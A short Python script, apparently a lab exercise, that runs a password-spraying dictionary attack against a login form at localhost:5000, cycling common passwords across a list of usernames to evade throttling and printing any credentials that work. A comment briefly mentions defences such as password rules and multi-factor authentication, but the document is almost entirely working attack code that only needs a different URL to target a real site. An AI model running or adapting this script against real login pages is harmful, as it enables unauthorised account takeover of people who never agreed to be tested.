import sys
import requests

usernames = [line.rstrip("\n") for line in open("active-user.txt")]
passfile = [lines.rstrip("\n") for lines in open("commonpasswords.txt")]
url = "http://localhost:5000/login"

'''to limit effect of throttling, try each password once for 
ever user until a match is found

Dictionary attack assumes people are the weakest link in security. 
Most people choose weak passwords because they are easy to remember.
To combat this you can set restrictions on passwords or use multiple 
authentication methods
'''
for password in passfile:
	for user in usernames:
		req = requests.post(url, data = {"username": user, "password": password})
		resp = req.text
		if "Invalid password"in resp:
			print("------------------ Password not found")
		else:
			print("------------Password Found -----------")
			print("Username:- " + user)
			print("Password:- " + password)
			sys.exit(0)
